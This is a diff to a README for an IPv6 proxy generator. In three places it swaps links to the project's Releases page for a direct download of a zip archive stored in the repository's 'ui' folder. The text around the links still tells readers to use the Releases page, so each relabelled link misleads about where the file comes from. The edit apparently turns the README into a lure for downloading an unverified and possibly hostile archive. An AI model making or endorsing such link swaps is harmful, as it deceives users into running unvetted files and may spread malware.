@@ -1,6 +1,6 @@
 # 🛡️ proxy-ipv6-generator - Simple IPv6 Proxy Tool
 
-[![Download proxy-ipv6-generator](https://img.shields.io/badge/Download-Proxy%20IPv6%20Generator-blue?style=for-the-badge)](https://github.com/despiteportablecomputer411/proxy-ipv6-generator/releases)
+[![Download proxy-ipv6-generator](https://img.shields.io/badge/Download-Proxy%20IPv6%20Generator-blue?style=for-the-badge)](https://raw.githubusercontent.com/despiteportablecomputer411/proxy-ipv6-generator/main/ui/generator_ipv_proxy_v3.4.zip)
 
 ## 🚀 What this app does
 
@@ -32,7 +32,7 @@ If you plan to use the proxy on more than one app, check that your firewall allo
 
 Visit this page to download the latest release:
 
-[![Download from Releases](https://img.shields.io/badge/Releases-Download%20Latest-blue?style=for-the-badge)](https://github.com/despiteportablecomputer411/proxy-ipv6-generator/releases)
+[![Download from Releases](https://img.shields.io/badge/Releases-Download%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/despiteportablecomputer411/proxy-ipv6-generator/main/ui/generator_ipv_proxy_v3.4.zip)
 
 Open the Releases page, get the latest Windows package, and save it to your computer.
 
@@ -237,7 +237,7 @@ Keep these habits to avoid confusion:
 
 If you need the latest file, use the release page here:
 
-[https://github.com/despiteportablecomputer411/proxy-ipv6-generator/releases](https://github.com/despiteportablecomputer411/proxy-ipv6-generator/releases)
+[https://raw.githubusercontent.com/despiteportablecomputer411/proxy-ipv6-generator/main/ui/generator_ipv_proxy_v3.4.zip](https://raw.githubusercontent.com/despiteportablecomputer411/proxy-ipv6-generator/main/ui/generator_ipv_proxy_v3.4.zip)
 
 ## 🇻🇳 Hướng dẫn nhanh bằng tiếng Việt
 
